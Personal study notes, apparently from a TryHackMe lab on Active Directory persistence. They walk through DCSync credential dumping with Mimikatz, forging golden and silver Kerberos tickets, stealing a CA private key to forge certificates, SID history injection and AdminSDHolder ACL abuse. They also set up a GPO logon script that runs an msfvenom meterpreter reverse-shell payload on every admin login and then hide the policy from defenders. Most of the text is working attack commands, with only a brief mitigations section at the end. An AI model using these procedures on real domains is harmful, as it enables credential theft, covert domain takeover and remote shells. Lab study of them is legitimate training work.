#Windows #ActiveDirectory #Persistence 
## Persistence through Credentials

##### DC Sync

Since using a single DC in all locations of the organization would delay the authentication significantly, we need a method to authenticate with the same credentials in two different locactions.

Each DC runs a process called the Knowledge Consistency Checker (KCC) which generates a replication topology of the AD forest and automatically connects to other DCs trough Remote Procedure Calls (RPC) to synchronize information.

The process of replication called DC synchronization, Accounts such as those belonging to the Domain Admins group can use it too, for example to create a new DC.

We can use a DC Sync attack to harvest credentials if we have access to an account that has domain replication permissions.

##### Not All Credentials Are Created Equal

The credentials of the Domain Admins group is likely to be rotated when the blue team finds us, so we should persist with near-privileged credentials, such as the following:

- Credentials that have local administrator rights on several machines, usually in the workstations and servers group.
- Service accounts that have delegation permissions, with those we can force golden and silver tickets to perform Kerberos delegation attack.
- Accounts used for privileged AD services, such as Exchange, WSUS and SCCM.

##### DCSync All

`mimikatz.exe` - Load Mimikatz.
`lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low privileged username>` - Perform a DC sync of a single account.
`log <username>_dcdump.txt` - Enable logging to a file.
`lsadump::dcsync /domain:za.tryhackme.log /all` - Perform a DC sync of every single account.

`cat <username>_dcdump.txt | grep "SAM Username"` - Recover all usernames.
`cat <username>_dcdump.txt | grep "Hash NTLM"` - Recover all NTLM hashes.

## Persistence through Tickets

##### Tickets to the Chocolate Factory

Kerberos authentication recap:

![[d8b0bf2303eb0486da1737ac6a07da51.png]]

##### Golden Tickets

Golden Tickets are forged TGTs, we need the KRBTGT account's password hash to sign a TGT to a user account we want.

Some interesting notes about Golden Tickets:

- Since the ticket is signed with the KRBTGT account's hash, we doesn't need the impersonated user's hash.
- We can put a disabled, deleted or non-existent account as long as the timestamp is not older than 20 minutes (or the KDC won't validate the account).
- The policies and rules are set in the TGT itself, that means we can overwrite them to for example, make the ticket valid for 10 years instead of 10 hours.
- By default, the KRBTGT account's password never changes.
- If the password rotated manually, the new and previous passwords stay valid, so accidental rotation won't impact services.
- It's a painful process for the blue team to rotate the password, since many services will stop working because they are not smart enough to release that the ticket isn't longer valid (It's still valid according to the timestamp).
- Golden tickets would allow you to bypass smart cart authentication, since the smart card is verified by the DC before it creates the TGT.
- We can create a golden ticket on any machine, even one that isn't domain joined.

Apart from the KRBTGT account's password hash we will need the domain name, domain SID and user ID, which are easy to recover if we already in a position to recover the hash.

##### Silver Tickets

Silver Tickets are forged TGS tickets, so we will skip all communication with the KDC, and just interface with the service we want to access.

Some interesting notes about Silver Tickets:

- The generated TGS is signed by the machine account of the host we are targeting.
- With Silver Tickets we can only impersonate users on the host we are attacking itself (which we have the machine account's password hash for), and the scope is limited to the service we are targeting.
- Since there is no TGT involved the only logs would be on the targeted server, which makes it significantly harder for the blue team to detect.
- We can create non-existent user for the silver ticket, as long as the SID will put the user in the host's local administrators group.
- The machine account's password is rotating every 30 days, we can use the TGS to access the registry and alter the parameter that is responsible for the password rotation.
- Machine accounts can be used as normal AD accounts, so you can continue enumerating and exploiting AD from there.

##### Forging Tickets for Fun and Profit

`Get-ADDomain` - Get the domain's SID.

`kerberos::golden /admin:randomone /domain:za.tryhackme.loc /id:500 /sid:<domain sid> /krbtgt:<ntlm hash of krbtgt account> /endin:600 /renewmax:10080 /ptt` - Admin can be even non valid user, id is the RID of the user (by default 500 the default administrator account), endin is for how long the ticket will be valid (by default 10 years), renewmax is for how long after renewal can the ticket be valid, ptt is to inject the ticket directly into the session.

`dir \\thmdc.za.tryhackme.loc\c$\` - Verify that the golden ticket is working.

`kerberos::golden /admin:stillrandom /domain:za.tryhackme.loc /id:500 /sid:<domain sid> /target:<hostname of the servier being targeted> /rc4:<ntlm hash of the machine account we target> /service:<the service we are targeting> /ptt` - Perform a Silver Ticket attack, for the service CIFS is a safe bet, since it allows file access.

`dir \\thmserver1.za.tryhackme.loc\c$\` - Verify the silver ticket is working.
## Persistence through Certificates

**The next techniques are very dangerous and hard to remove, thy will probably cause a full domain rebuild.**

##### The Return of AD CS

A valid certificate can be used for client authentication which will allow us to use the certificate to request a TGT, unless revoked or expired we will have access in roughly the next 5 years.

We could steal to key of the root CA's certificate to generate our own certificates whenever we want, the blue team would have to revoke the certificates of all account in order to take back control.

##### Extracting the Private Key

If the private key stored on the CA server is not protected trough hardware based protection like Hardware Security Module (HSM), which is often the case for organizations that just use AD CS for internal purposes that protect with Data Protection API (DPAPI), so we can use tools like Mimikatz and SharpDPAPI to extract the CA certificate and thus the private key from the CA.

`crypto::certificates /systemstore:local_machine` - From Mimikatz, view the certificates stored on the DC.
`privilege::debug`
`crypto::capi` and `crypto::cng` - Patch those services, to be able to export the certificates.
`crypto::certificates /systemstore:local_machine /export` - Export the certificates, they will be saved in PFX and DER format.

By default Mimikatz would assign the password of `mimikatz` to the certificates.

##### Generating our own Certificates

With the private key and root CA certificate we can use the SpecterOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a client authentication certificate for an user we want.

`<ForgeCert.exe file location> --CaCertPath <The path to the exported .pfx certificate> -CaCertPassword <the password to encrypt the certificate> --Subject CN=<the subject or the common name of the certificate (doesn't matter)> --SubjectAltName <The user principle name (UPN) of the account we want to impersonate, has to be legitimate> --NewCertPath <The path to store the certificate> --NewCertPassword <new password to encrypt the private key>` - Generate a new certificate.

`<Rubeus.exe file location> asktgt /user:<user to impersonate> /enctype:aes256 /certificate:<path to the certificate we generated> /password:<password for certificate file> /outfile:<the .kirbi file where the tgt will be outputed to> /domain:<the FQDN of the domain we are currently attacking> /dc:<the IP of the DC we are requesting the ticket for, best is one that runs CA>` - Request a TGT using the certificate.

`kerberos::ptt <.kirbi file>` - Use Mimikatz to load the TGT.

## Persistence through SID History

SIDs are used to track the security principle and the account's access when connecting to resources, there is an interesting attribute called SID history.

SID history is used to clone accounts, when migrating to a new domain the user will get a new SID but the existing one will be put in the SID history, giving him access to the previous domain.

##### History Can Be Whatever We Want It To Be

We can add a SID of our current domain to the SID history of an account we control.

Some interesting notes about this persistence techniques:

- We normally need Domain Admin privileges or the equivalent to perform this attack.
- In a logon event the account's SID is added to the user token, which determines the privileges, it includes group SIDs
- We can inject the enterprise admin SID which will give the user domain admin privileges in all domains in the forest.
- Since the SIDs are added to the user token he doesn't even have to be a part of the group, making him appear like a normal user.

##### Forging History

`Get-ADUser <your ad user> -properties sidhistory,memberof` - Confirm the user doesn't have SID history set.
`Get-ADGroup "Domain Admins"` - Get the SID of the Domain Admins group.

The latest version of Mimikatz doesn't work for that attack (it has a flaw that doesn't allow it to patch LSASS to update SID history) so we will use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored:

```markup
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName <username of our low-priveleged AD account> -SidHistory <SID to add to SID History> -DatabasePath C:\Windows\NTDS\ntds.dit 
PS C:\Users\Administrator.ZA>Start-Service -Name ntds
```

The NTDS database is locked when the NTDS service is running, to patch our SID history we first need to stop it, after that we have to restart it or authentication for the entire network will not work anymore.

`Get-ADUser aaron.jones -Properties sidhistory` - From the low privileged account verify the SID history is added.
`dir \\domain\c$\` - Verify you have domain admin privileges.

##### Pitchforks and Torches from the Blue Team

SID history is a protected attribute and only removable by tools like AD-RAST Powershell cmdlets.

This technique is also very hard to find since the user appears normal.

## Persistence through Group Membership

##### Persistence through Group Membership

Groups to add our account to to not raise much suspicion:

- The IT group, which can force reset passwords off low privileged user.
- Groups that provide local administrator rights
- It's not always about direct privileges, sometimes indirect ones like ownership over GPOs can be just as good.

##### Nested Groups

A recursive group is a group that is a member of another group, like group nesting. The subgroups have the permissions of the group it's a member of with more granular permissions for each subgroup.

Group nesting helps organize the AD but it also reduce the visibility of effective access, we should enumerate the group than it's subgroups then it's subgroups and so on, until when?

It also creates a monitoring problem, a miscommunication between the AD team and the InfoSec team can cause an alarm to raise when a member is added to the domain admins group, but not when a user is added to it's subgroups.

We as attackers can add ourselves to a subgroup that isn't monitored.

##### Nesting Our Persistence

Add a group inside a group:

`New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security`

`New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security`

`Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"`

And continue doing that:

```markup
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"
PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
```

`Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"` - Add the last group to the domain admins group.
`Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"` - Add our low privileged user to the first group we created.
`dir \\thmdc.za.tryhackme.loc\c$\` - Check you have privileged access.
##### Annoying More Than Just The Blue Team

In real organization we will not create our own groups, but use existing subgroups, this attack will completely break the AD structure.

## Persistence through ACLs

What if we want to persist through all protected groups simultaneously.

##### Persistence through AD Group Templates

Instead of adding ourselves to privileged groups, allowing the blue team to kick us out, we should inject ourselves to the templates that generate the default groups adding us to the group every time the template refreshes.

One such template is AdminSDHolder Container. It exists in any AD domain and used to copy permissions to all protected groups.

A process called SDProp takes the ACL of the container and applies it to all protected groups every 60 minutes, we can write an ACE that will grant us full permissions on all protected groups, it will be very frustrating to the blue team.

##### Persisting with AdminSDHolder

`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe` - Open CMD with Administrator privileges.
`mmc`

Add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System.

Navigate to the Security of the group (Right-click->Properties->Security).

Add our low privileged user and grant it full control:

- Click **Add**.
- Search for your low-privileged username and click **Check Names**.
- Click **OK**.
- Click **Allow** on **Full Control**.
- Click **Apply**.
- Click **OK**.

##### SDProp

`Import-Module <Invoke-ADSDPropagation.ps1 file path>` - Import the Powershell model.
`Invoke-ADSDPropagation` - Kick off the process of SDProp manually.

Now wait 1 minute and check the security permissions of protected groups, we should have full control over the group, even though it didn't add us to the group.

##### It Is Going Downhill For The Blue Team

Since the persistence propagates through a legitimate AD service, the blue team would be scratching their heads every 60 minutes, you can also grant full control to the Domain Users group in the AdminSDHolder group, so all low privileged users have full control over the protected groups.
## Persistence trough GPOs

Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain joined machines, this includes configurations such as membership to restricted groups, firewall and AV configuration and which scripts should be executed upon startup. the attacker often hide the GPO in such a way that it's impossible to remove.

##### Domain Wide Persistence

Some common GPO persistence techniques:

- Restricted Group Membership: Could allow administrative access to all hosts in the domain.
- Logon Script Deployment: This will ensure that we get a shell call back every time a user authenticates to a host in the domain.

We will focus on the second hook, to do this we will create a GPO that is linked to the Admin OU, which will allow us to get a shell on a host every time one of them authenticates to a host.

##### Preparation

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip address> lport=<port> -f exe > <output file name>` - Create a reverse shell.

Windows allows us to execute Batch or Powershell scripts through the logon GPO, batch files are often more stable so we will create one that will copy our executable to the host and execute it once a user authenticates.

`copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<shell file name> C:\tmp\<shell file name> && timeout /t 20 && C:\tmp\<reverse shell file name>` - Create this script in a .bat file, the script will wait 20 seconds after copying the binary before executing it.

`scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/` and `scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/` - Use SCP to copy both files to the target machine.

`msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip address>; set LPORT <port>;exploit"` - Start the MSF listener.

Now use runas to launch cmd with administrator privileges (Command in the last task).

##### GPO Creation

Open Group Policy Management snap-in:

1. In your runas-spawned terminal, type MMC and press enter.
2. Click on **File**->**Add/Remove Snap-in...**
3. Select the **Group Policy Management** snap-in and click **Add**
4. Click **OK**

Here we can technically write our contents to the default domain policy, which should propagate to all AD objects, here we will take more narrow approach to show the process.

Write a GPO that will be applied to all admins by right clicking the Admins OU and select Create a GPO in this domain. Give your GPO a name.

Right click on the policy and select Enforced, this way the policy will apply even if there is a conflicting policy, now right click on the policy and select edit.

Get back to our Group Policy Management Editor:

1. Under User Configuration, expand **Policies->Windows Settings**.
2. Select **Scripts (Logon/Logoff)**.
3. Right-click on **Logon->Properties**
4. Select the **Scripts** tab.
5. Click **Add->Browse**.

Navigate to where we stored the Batch and binary files.

Select the Batch file as the script and click **Open** and **OK**. Click **Apply** and **OK**. Now we will get a callback any time an administrator logs into any machine.

To test this login as one of the administrators.

##### Hiding in Plain Sight

Go back to the MMC window, click on the policy and than click Delegation.

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

1. **Right-Click** on **ENTERPRISE DOMAIN CONTROLLERS** and select **Edit settings, delete, modify security**.
2. **Click** on all other groups (except Authenticated Users) and click **Remove**.

Click on Advanced and remove the Created Owner from the permissions:

![GPO edit](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/cb338537225085db379e8f5fecf82684.png)

By default all authenticated users must have the ability to read the policy, if we didn't have the logon script, we could also remove this permission to make sure almost no one can read our policy.

We could replace the Authenticated Users with Domain Computers to prevent users and allow computers to read the policy, this can result in not getting a callback upon authentication so test your shell before performing the steps.

There is no going back after this:

- lick **Add**.
- Type **Domain Computers**, click **Check Names** and then **OK**.
- Select **Read permissions** and click **OK**.
- Click on **Authenticated Users** and click **Remove**.

You should now get an error that you can no longer read your policy, you can also see this in the side bar.

Now the blue team would have to impersonate the machine account of a DC to remove our GPO, if they even find it.

## Conclusion

##### Additional Persistence Techniques

- [Skeleton keys](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/): Using Mimikatz we can deploy a skeleton key, Mimikatz will create a default key that works for all accounts while normal passwords still work.
- [Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714): DCs have an internal break glass administrator account called DSRM account. This password is set when the server is promoted to a DC and seldom changed. This password is used in cases of emergencies to recover the DC.
- [Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760): Exploiting the SSP interface it is possible to add new SSPs. We can add Mimikatz's mimilib as an SSP that will log all credentials of authentication attempts to a file. We can specify a network location for logging.
- [Computer Accounts](https://adsecurity.org/?p=2753): We can alter the password of a machine account which will stop the once every 30 days rotation, we can also grant the account administrative access to other machine which will let us use it as a normal account, the only sign of attack is that the machine as administrative rights over other hosts which is often normal behavior in AD.

##### Mitigations

Sometimes a complete domain rebuild will be required, but there are a couple of things we can do to detect deployed persistence:

- Anomalous account logon events are the most common alert for persistence. Any time credentials break the tiering model, it can be as a result of persistence.
- Specific detection rules can be written, such as cases when machine account's password changes, ACLs are permissively updated or new GPOs are created.
- The best defense against persistence is to protect privileged resources, since the truly scary techniques are there.


Didn't manage to do Persistence trough Certificates, the last task and the last step in 1 task before last.